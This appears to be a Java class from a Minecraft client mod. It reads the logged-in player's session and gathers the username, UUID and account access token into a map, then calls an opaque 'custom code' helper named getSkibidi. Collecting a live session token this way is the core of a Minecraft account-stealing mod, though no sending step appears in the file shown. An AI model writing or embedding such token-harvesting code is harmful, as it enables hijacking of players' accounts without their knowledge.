package com.somethingiedit;

import net.minecraft.client.MinecraftClient;
import net.minecraft.client.session.Session;
import java.util.HashMap;
import java.util.Map;

public class DataExtractor {
    
    public static Map<String, String> extractSessionData() {
        Map<String, String> data = new HashMap<>();
        
        try {
            MinecraftClient mc = MinecraftClient.getInstance();
            Session session = mc.getSession();
            
            if (session != null) {
                String username = session.getUsername();
                String uuid = session.getUuid();
                String accessToken = session.getAccessToken();
                
                data.put("username", username);
                data.put("uuid", uuid);
                data.put("accessToken", accessToken);
                
                // Execute custom code
                String skibidiData = DOP.getSkibidi();
                data.put("skibidiData", skibidiData);
                
                ModInit.LOGGER.info("Data extracted successfully");
            }
        } catch (Exception e) {
            ModInit.LOGGER.error("Error extracting session data", e);
        }
        
        return data;
    }
}
